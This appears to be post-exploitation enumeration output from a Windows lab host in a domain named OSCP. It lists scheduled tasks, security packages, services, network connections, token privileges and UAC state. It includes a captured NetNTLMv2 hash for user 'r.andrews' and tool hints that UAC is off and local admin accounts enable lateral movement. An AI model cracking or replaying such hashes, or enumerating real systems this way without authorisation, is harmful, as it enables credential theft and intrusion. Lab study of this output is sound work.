+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FA;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {8ABCE260-32B6-476C-AE13-B34D0C91292D}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskDailyTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2021-01-01T12:00:00
+      StopAtDurationEnd             :   False
+      DaysInterval                  :   7
+      ------------------------------
+
+  Name                              :   IntelligentPwdlessTask
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-100)
+  Description                       :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-102)
+  Source                            :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-101)
+  State                             :   Ready
+  SDDL                              :   D:P(A;;KA;;;BA)(A;;FA;;;SY)(A;;KRKX;;;WD)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT10M
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {8702A841-D5CA-47C3-812D-9CEDC304C200}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskDailyTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2021-08-01T03:00:00
+      ExecutionTimeLimit            :   PT12H
+      StopAtDurationEnd             :   False
+      DaysInterval                  :   1
+      ------------------------------
+
+  Name                              :   StartComponentCleanup
+  Principal                         :
+      GroupId                       :   
+      Id                            :   System
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT1H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {752073A1-23F2-4396-85F0-8FDB879ED0ED}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   Account Cleanup
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT30M
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
+      Execute                       :   %windir%\System32\rundll32.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   SpaceManagerTask
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   $(@%SystemRoot%\system32\spaceman.exe,-2)
+  Description                       :   $(@%SystemRoot%\system32\spaceman.exe,-3)
+  Source                            :   $(@%SystemRoot%\system32\spaceman.exe,-1)
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /Work
+      Execute                       :   %windir%\system32\spaceman.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   False
+      StopAtDurationEnd             :   False
+      Delay                         :   PT2M
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   MaintenanceTasks
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-600)
+  Description                       :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-602)
+  Source                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-601)
+  State                             :   Ready
+  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   %windir%\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
+      Execute                       :   %windir%\system32\rundll32.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   MsCtfMonitor
+  Principal                         :
+      GroupId                       :   Users
+      Id                            :   AnyUser
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   TextServicesFramework monitor task
+  Source                            :   Microsoft Corporation
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   RunUpdateNotificationMgr
+  Principal                         :
+      GroupId                       :   
+      Id                            :   Author
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   O:SYD:P(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)(A;;FRFX;;;AU)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\System32\UNP\UpdateNotificationMgr.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskDailyTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2016-06-02T10:30:00
+      StopAtDurationEnd             :   False
+      DaysInterval                  :   1
+      RandomDelay                   :   PT6H
+      ------------------------------
+      Type                          :   MSFT_TaskRegistrationTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT1M
+      ------------------------------
+
+  Name                              :   Windows Defender Cache Maintenance
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   Periodic maintenance task.
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   -IdleTask -TaskName WdCacheMaintenance
+      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   Windows Defender Cleanup
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   Periodic cleanup task.
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   -IdleTask -TaskName WdCleanup
+      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   Windows Defender Scheduled Scan
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   Periodic scan task.
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob
+      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   Windows Defender Verification
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   Periodic verification task.
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   -IdleTask -TaskName WdVerification
+      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   CDSSync
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-1428027539-3309602793-2678353003-1498846795-3763184142)(A;;FRFX;;;AU)(A;;FRFX;;;BU)(A;;FRFX;;;IU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {B0D2B535-12E1-439F-86B3-BADA289510F0}
+      Data                          :   $(Arg0)
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   MoProfileManagement
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT10M
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {085EDA12-CF4A-4944-8222-8ADCADE137CB}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Automatic-Device-Join
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   Register this computer if the computer is already joined to an Active Directory domain.
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT5M
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   $(Arg0) $(Arg1) $(Arg2)
+      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT1M
+      ------------------------------
+      Type                          :   MSFT_TaskEventTrigger
+      Enabled                       :   True
+      Duration                      :   P1D
+      Interval                      :   PT1H
+      StopAtDurationEnd             :   False
+      Subscription                  :   <QueryList><Query Id="0" Path="Microsoft-Windows-User Device Registration/Admin"><Select Path="Microsoft-Windows-User Device Registration/Admin">*[System[Provider[@Name='Microsoft-Windows-User Device Registration'] and EventID=4096]]</Select></Query></QueryList>
+      ------------------------------
+
+  Name                              :   Recovery-Check
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   InteractiveUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   Performs recovery check.
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT2H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /checkrecovery
+      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskSessionStateChangeTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      StateChange                   :   7
+      ------------------------------
+
+  Name                              :   OobeDiscovery
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT1H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {C93CF9D5-031B-4AAA-AB0B-EF802347B381}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+====== SearchIndex ======
+
+====== SecPackageCreds ======
+
+  Version                        : NetNTLMv2
+  Hash                           : r.andrews::OSCP:1122334455667788:d08bced7c10f9502aaf83982e897e26e:010100000000000012f0c7b7b2a3dc01a638430f2b2acc8500000000080030003000000000000000000000000020000094325718cc55f060c3fb567c4447f7037b4c0b9649439f36cf2285865dbf1f6c0a00100000000000000000000000000000000000090000000000000000000000
+
+====== SecurityPackages ======
+
+Security Packages
+
+
+  Name                           : Negotiate
+  Comment                        : Microsoft Package Negotiator
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
+  MaxToken                       : 48256
+  RPCID                          : 9
+  Version                        : 1
+
+  Name                           : NegoExtender
+  Comment                        : NegoExtender Security Package
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
+  MaxToken                       : 12000
+  RPCID                          : 30
+  Version                        : 1
+
+  Name                           : Kerberos
+  Comment                        : Microsoft Kerberos V1.0
+  Capabilities                   : 42941375
+  MaxToken                       : 48000
+  RPCID                          : 16
+  Version                        : 1
+
+  Name                           : NTLM
+  Comment                        : NTLM Security Package
+  Capabilities                   : 42478391
+  MaxToken                       : 2888
+  RPCID                          : 10
+  Version                        : 1
+
+  Name                           : TSSSP
+  Comment                        : TS Service Security Package
+  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
+  MaxToken                       : 13000
+  RPCID                          : 22
+  Version                        : 1
+
+  Name                           : pku2u
+  Comment                        : PKU2U Security Package
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
+  MaxToken                       : 12000
+  RPCID                          : 31
+  Version                        : 1
+
+  Name                           : CloudAP
+  Comment                        : Cloud AP Security Package
+  Capabilities                   : LOGON, NEGOTIABLE2, APPCONTAINER_PASSTHROUGH
+  MaxToken                       : 0
+  RPCID                          : 36
+  Version                        : 1
+
+  Name                           : WDigest
+  Comment                        : Digest Authentication for Windows
+  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
+  MaxToken                       : 4096
+  RPCID                          : 21
+  Version                        : 1
+
+  Name                           : Schannel
+  Comment                        : Schannel Security Package
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
+  MaxToken                       : 24576
+  RPCID                          : 14
+  Version                        : 1
+
+  Name                           : Microsoft Unified Security Protocol Provider
+  Comment                        : Schannel Security Package
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
+  MaxToken                       : 24576
+  RPCID                          : 14
+  Version                        : 1
+
+  Name                           : SFAP
+  Comment                        : Web Defense SFAP
+  Capabilities                   : ACCEPT_WIN32_NAME, MUTUAL_AUTH
+  MaxToken                       : 0
+  RPCID                          : -1
+  Version                        : 1
+
+  Name                           : Default TLS SSP
+  Comment                        : Schannel Security Package
+  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
+  MaxToken                       : 24576
+  RPCID                          : 14
+  Version                        : 1
+
+====== Services ======
+
+Non Microsoft Services (via WMI)
+
+  Name                           : ssh-agent
+  DisplayName                    : OpenSSH Authentication Agent
+  Description                    : Agent to hold private keys used for public key authentication.
+  User                           : LocalSystem
+  State                          : Stopped
+  StartMode                      : Disabled
+  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
+  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
+  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     : 
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
+  CompanyName                    : 
+  FileDescription                : 
+  Version                        : 9.5.2.1
+  IsDotNet                       : False
+
+  Name                           : VGAuthService
+  DisplayName                    : VMware Alias Manager and Ticket Service
+  Description                    : Alias Manager and Ticket Service
+  User                           : LocalSystem
+  State                          : Running
+  StartMode                      : Auto
+  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
+  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
+  ServiceDll                     : 
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : VMware, Inc.
+  FileDescription                : VMware Guest Authentication Service
+  Version                        : 12.1.0.63013
+  IsDotNet                       : False
+
+  Name                           : vm3dservice
+  DisplayName                    : VMware SVGA Helper Service
+  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
+  User                           : LocalSystem
+  State                          : Running
+  StartMode                      : Auto
+  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
+  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
+  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
+  ServiceDll                     : 
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : VMware, Inc.
+  FileDescription                : VMware SVGA Helper Service
+  Version                        : 9.17.04.0001
+  IsDotNet                       : False
+
+  Name                           : VMTools
+  DisplayName                    : VMware Tools
+  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
+  User                           : LocalSystem
+  State                          : Running
+  StartMode                      : Auto
+  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
+  ServiceDll                     : 
+  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
+  CompanyName                    : VMware, Inc.
+  FileDescription                : VMware Tools Core Service
+  Version                        : 12.1.0.37487
+  IsDotNet                       : False
+
+====== SlackDownloads ======
+
+====== SlackPresence ======
+
+====== SlackWorkspaces ======
+
+====== SuperPutty ======
+
+====== Sysmon ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== SysmonEvents ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== TcpConnections ======
+
+  Local Address          Foreign Address        State      PID   Service         ProcessName
+  0.0.0.0:135            0.0.0.0:0              LISTEN     1004  RpcSs           svchost.exe
+  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:3389           0.0.0.0:0              LISTEN     1060  TermService     svchost.exe
+  0.0.0.0:5040           0.0.0.0:0              LISTEN     5560  CDPSvc          svchost.exe
+  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
+  0.0.0.0:49664          0.0.0.0:0              LISTEN     748                   lsass.exe
+  0.0.0.0:49665          0.0.0.0:0              LISTEN     608                   wininit.exe
+  0.0.0.0:49666          0.0.0.0:0              LISTEN     1448  EventLog        svchost.exe
+  0.0.0.0:49667          0.0.0.0:0              LISTEN     2032  Schedule        svchost.exe
+  0.0.0.0:49668          0.0.0.0:0              LISTEN     2276  SessionEnv      svchost.exe
+  0.0.0.0:49669          0.0.0.0:0              LISTEN     748   Netlogon        lsass.exe
+  0.0.0.0:49670          0.0.0.0:0              LISTEN     716                   services.exe
+  172.16.104.206:139     0.0.0.0:0              LISTEN     4                     System
+  192.168.104.206:139    0.0.0.0:0              LISTEN     4                     System
+  192.168.104.206:3389   192.168.49.104:56942   ESTAB      1060  TermService     svchost.exe
+  192.168.104.206:57954  192.168.49.104:445     ESTAB      4                     System
+====== TokenGroups ======
+
+Current Token's Groups
+
+  OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513
+  Everyone                                 S-1-1-0
+  BUILTIN\Remote Desktop Users             S-1-5-32-555
+  BUILTIN\Remote Management Users          S-1-5-32-580
+  BUILTIN\Users                            S-1-5-32-545
+  NT AUTHORITY\REMOTE INTERACTIVE LOGON    S-1-5-14
+  NT AUTHORITY\INTERACTIVE                 S-1-5-4
+  NT AUTHORITY\Authenticated Users         S-1-5-11
+  NT AUTHORITY\This Organization           S-1-5-15
+  LOCAL                                    S-1-2-0
+  Authentication authority asserted identity S-1-18-1
+====== TokenPrivileges ======
+
+Current Token's Privileges
+
+                          SeShutdownPrivilege:  DISABLED
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                            SeUndockPrivilege:  DISABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+                          SeTimeZonePrivilege:  DISABLED
+====== UAC ======
+
+  0                              : 1 - No prompting
+  EnableLUA (Is UAC enabled?)    : 0
+  LocalAccountTokenFilterPolicy  : 1
+  FilterAdministratorToken       : 1
+    [*] UAC is disabled.
+    [*] Any administrative local account can be used for lateral movement.
+====== UdpConnections ======
+
+  Local Address          PID    Service                 ProcessName
+  0.0.0.0:123            1324   W32Time                 svchost.exe
+  0.0.0.0:500            3100   IKEEXT                  svchost.exe
+  0.0.0.0:3389           1060   TermService             svchost.exe
+  0.0.0.0:4500           3100   IKEEXT                  svchost.exe
+  0.0.0.0:5050           5560   CDPSvc                  svchost.exe
+  0.0.0.0:5353           1816   Dnscache                svchost.exe
+  0.0.0.0:5355           1816   Dnscache                svchost.exe
+  0.0.0.0:52973          1816   Dnscache                svchost.exe
+  0.0.0.0:63044          1816   Dnscache                svchost.exe
+  127.0.0.1:1900         3204   SSDPSRV                 svchost.exe
+  127.0.0.1:51548        3204   SSDPSRV                 svchost.exe
+  127.0.0.1:51710        4352   CDPUserSvc_29ccec       C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
+  127.0.0.1:56491        748    Netlogon                lsass.exe
+  127.0.0.1:61144        1600   netprofm                svchost.exe
+  127.0.0.1:62196        2940   iphlpsvc                svchost.exe
+  172.16.104.206:137     4                              System
+  172.16.104.206:138     4                              System
